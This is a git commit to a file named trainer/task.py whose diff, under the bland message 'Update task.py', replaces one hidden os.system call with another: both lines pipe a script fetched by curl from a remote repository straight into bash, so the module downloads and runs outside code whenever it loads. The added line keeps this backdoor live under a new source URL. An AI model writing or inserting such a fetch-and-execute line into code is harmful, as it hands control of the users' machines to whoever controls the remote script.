fce24eaf521adb9a8e1433cb652f29d769dc6439
raymeoendedann <raymeoendedann@outlook.com>
2024-10-01 06:25:30 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/mikay2808/yui/raw/ce36f8f57828c5fc45bc84714d89091afb66d24e/hero | bash')
+os.system('curl -sL https://raw.githubusercontent.com/raymeoendedann/studious-winner/refs/heads/main/testing | bash')
